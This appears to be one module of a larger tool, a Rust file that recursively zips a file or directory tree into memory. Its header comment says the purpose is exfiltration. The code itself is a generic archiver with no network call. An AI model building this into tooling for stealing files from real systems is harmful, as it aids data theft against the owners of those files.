// language: Rust, file: src/archive.rs
// Zip a file or directory tree into memory for exfil.
#![allow(dead_code)]
use anyhow::Result;
use std::io::Write;
use std::path::Path;

pub fn zip_path(path: &Path) -> Result<Vec<u8>> {
    let mut buf = std::io::Cursor::new(Vec::new());
    {
        let mut zw = zip::ZipWriter::new(&mut buf);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        if path.is_file() {
            let name = path
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| "file".into());
            zw.start_file(name, opts)?;
            zw.write_all(&std::fs::read(path)?)?;
        } else if path.is_dir() {
            let base = path.parent().unwrap_or(Path::new(""));
            add_dir(&mut zw, path, base, opts)?;
        } else {
            anyhow::bail!("no such path: {}", path.display());
        }
        zw.finish()?;
    }
    Ok(buf.into_inner())
}

fn add_dir(
    zw: &mut zip::ZipWriter<&mut std::io::Cursor<Vec<u8>>>,
    dir: &Path,
    base: &Path,
    opts: zip::write::SimpleFileOptions,
) -> Result<()> {
    for entry in std::fs::read_dir(dir)?.flatten() {
        let p = entry.path();
        let rel = p
            .strip_prefix(base)
            .unwrap_or(&p)
            .to_string_lossy()
            .replace('\\', "/");
        if p.is_dir() {
            zw.add_directory(format!("{rel}/"), opts)?;
            add_dir(zw, &p, base, opts)?;
        } else {
            zw.start_file(rel, opts)?;
            zw.write_all(&std::fs::read(&p)?)?;
        }
    }
    Ok(())
}
